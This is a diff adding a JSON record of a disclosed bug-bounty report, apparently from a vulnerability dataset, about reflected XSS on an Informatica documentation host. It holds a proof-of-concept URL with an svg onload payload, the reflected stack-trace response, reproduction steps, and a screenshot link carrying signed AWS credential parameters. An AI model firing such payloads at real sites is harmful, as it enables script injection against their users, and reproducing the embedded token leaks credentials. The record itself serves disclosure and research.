@@ -1,0 +1,47 @@
+{
+  "reported_to": "Informatica",
+  "reported_by": "bigbear_ ",
+  "title": "[doc.rt.informaticacloud.com] Reflected XSS via Stack Strace",
+  "content": "\nHello.\nPoC for reflected XSS:\nhttp://doc.rt.informaticacloud.com/infocenter/ActiveVOS/v92/nav/7_1_2_3_2_1<svg/onload=alert(document.domain)>\nResponse:\nCode 2.30 KiB\n1<body><h2>HTTP ERROR 500</h2>\n2<p>Problem accessing /help/nav/7_1_2_3_2_1%3Csvg/onload=alert(document.domain)%3E. Reason:\n3<pre>    For input string: \"1&lt;svg/onload=alert(document.domain)&gt;\"</pre></p><h3>Caused by:</h3><pre>java.lang.NumberFormatException: For input string: \"1<svg/onload=alert(document.domain)>\"\n4\tat java.lang.NumberFormatException.forInputString(NumberFormatException.java:65)\n5\tat java.lang.Integer.parseInt(Integer.java:492)\n6\tat java.lang.Integer.parseInt(Integer.java:527)\n7\tat org.eclipse.help.internal.webapp.servlet.NavServlet.getTopic(NavServlet.java:90)\n8\tat org.eclipse.help.internal.webapp.servlet.NavServlet.doGet(NavServlet.java:56)\n9\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:707)\n10\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:820)\n11\tat org.eclipse.equinox.http.registry.internal.ServletManager$ServletWrapper.service(ServletManager.java:180)\n12\tat org.eclipse.equinox.http.servlet.internal.ServletRegistration.handleRequest(ServletRegistration.java:90)\n13\tat org.eclipse.equinox.http.servlet.internal.ProxyServlet.processAlias(ProxyServlet.java:111)\n14\tat org.eclipse.equinox.http.servlet.internal.ProxyServlet.service(ProxyServlet.java:67)\n15\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:820)\n16\tat org.eclipse.equinox.http.jetty.internal.HttpServerManager$InternalHttpServiceServlet.service(HttpServerManager.java:318)\n17\tat org.mortbay.jetty.servlet.ServletHolder.handle(ServletHolder.java:502)\n18\tat org.mortbay.jetty.servlet.ServletHandler.handle(ServletHandler.java:380)\n19\tat org.mortbay.jetty.servlet.SessionHandler.handle(SessionHandler.java:181)\n20\tat org.mortbay.jetty.handler.ContextHandler.handle(ContextHandler.java:765)\n21\tat org.mortbay.jetty.handler.HandlerWrapper.handle(HandlerWrapper.java:152)\n22\tat org.mortbay.jetty.Server.handle(Server.java:324)\n23\tat org.mortbay.jetty.HttpConnection.handleRequest(HttpConnection.java:535)\n24\tat org.mortbay.jetty.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:865)\n25\tat org.mortbay.jetty.HttpParser.parseNext(HttpParser.java:540)\n26\tat org.mortbay.jetty.HttpParser.parseAvailable(HttpParser.java:213)\n27\tat org.mortbay.jetty.HttpConnection.handle(HttpConnection.java:404)\n28\tat org.mortbay.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:409)\n29\tat org.mortbay.thread.QueuedThreadPool$PoolThread.run(QueuedThreadPool.java:520)\n<image_0>\nPossible Fix:\nDisable Stack Trace on this resource.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Cross-site Scripting (XSS) - Reflected"
+  ],
+  "screenshots": {
+    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/188/420/987e3c60e2913cff55d69a2fe49705b20dbea234/2017-05-27_05-14-39.png?response-content-disposition=attachment%3B%20filename%3D%222017-05-27_05-14-39.png%22%3B%20filename%2A%3DUTF-8%27%272017-05-27_05-14-39.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRFICECNA%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T021832Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDqGYTLnh5tpIOp%2BBu2Us%2BRw1i52eon3doC2lLG%2FAZ0%2BwIgHItMlaeaBdH%2FEjdYfdSK%2Fr2oJjwbxvvT1OO8FMRmxYoquwUI%2Bv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDNWECp3I%2F1QPp%2BcOYCqPBeyg5MMY1W5ewovCqDXd8gxtn%2Fc5%2FQj4HNPCx%2F71OFHgMReknz2jZjY%2B0ZjUPvyzaShcO4JP6ELP9hwmnl%2FMeNzHTMswiIjuwjx7j4qTMUjILB7e%2F94l9VKEcMAJ7o8RvJAMHCTTos0L6sMpwaHD2f6imQ9Y0sjHlFcQmy6gji%2F%2BwyY%2BshQbky5jMNE%2BfQMJRjv4PMBPDtMczy2j6DzwOLUgZ%2F4E%2FpDfY67DWHYam5qWGfIvV6T5fvytnYFIawEywnxmch2DA3lv0DioRBsLDf07t%2B9ua%2FfK7hJAz8uBNkCRY%2BSW7IBp%2BK3qQb5bsEI%2F3VzrVTFjw6z3QWOvrO6jelIrCS1UbCyMJ1vNLE1Z%2BQRo%2BWzjZkF4%2F3TqZVx6alqwnpih5d%2BiCtDMBzPtvqI2DZJY5GrrpmwNYONCjpLRQ53%2FV4kpgSZH4p%2FY8pD0HFszYiLeYPjKmrWtppeAoziHfyG5LQCSK4A06EBg0wKsZPpRsUSNYMo2FVfhULyc64%2BJf4PjBSlxl%2FYYXfBePBQG5OzgdL5T9xa%2BQcpIZkgwLbAVo%2FBlqlFG1j062dgUTsl%2FJHPgzDzkmKHzDF2E9YTqfiLiGoavR3QiS3i8ZKkjG9ht2QmTpUEl35zEZrkPEW3CCK6n92x9GRYZcjM16VPBzUK69NKo9KJLNAaZ2kKhYA7U2Y00JAwTHVl7Kk4JkIJt0%2BKx1lCahbihZgt24NwLVTzaYkm47hKXyFVRilqnQNHe%2FOIFwWwJpYZJ%2FUeG5JDDdVhGrikxDo2jPBZrexD9Rby%2F8Itez87sZ72eTgvMhy1AuIhYDQBSIxQspKnTE6DVyr2Wvysnh8rQbLpxhTdX8ttzASoPWIkpZ1L1P1yLrHow4vWHvwY6sQESAbiZRKGYCmV926h2FLIfjA7WhXV%2BdXKuHmspf1ZK9KSgfTarg9IXFB9WslSzqoeHkxX276%2FLHeXMLn8kpS8i57zAalLCHRlWVQPHcKJvCOetUj1jvp4CuslPz5Pgf%2BtQrXs0mNqHMJaB1f7kBF54kvXQqSYRkhbcxK7uZxU1TbgkLeJ6zbqxtGSin9cWcjRQN5mVcMhnXof1vKRt4FJvZhTyCRMU1LuGqi%2FYlIm95xg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=db0f18911481660055cf8afa3c4a6cd138ba2f7a5331fc1cdd095a7313fff1e5"
+  },
+  "disclosed_date": 1658588580,
+  "report_url": "https://hackerone.com/reports/232320",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Navigate to the URL: http://doc.rt.informaticacloud.com/infocenter/ActiveVOS/v92/nav/7_1_2_3_2_1<svg/onload=alert(document.domain)>"
+    ],
+    [
+      2,
+      "Observe the reflected XSS in the error response, which includes the injected JavaScript code in the stack trace"
+    ]
+  ],
+  "vuln_description": "The vulnerability is a reflected Cross-Site Scripting (XSS) via the stack trace error message. The application reflects user input in the error response without proper sanitization, allowing JavaScript execution in the context of the victim's browser session.",
+  "reason": "The attack is straightforward, involving only a single component (URL parameter injection) with no complex interactions or state manipulation required. The vulnerability is discovered through basic input fuzzing techniques.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": true
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves a reflected XSS via stack trace, which is not related to authentication or authorization (AuthN/AuthZ) issues. The proposed methodologies focus on detecting IDOR and AuthN/AuthZ bypass vulnerabilities by analyzing user sessions, actions, and resource IDs, which are not applicable to XSS vulnerabilities.",
+    "is_detectable": false
+  }
+}
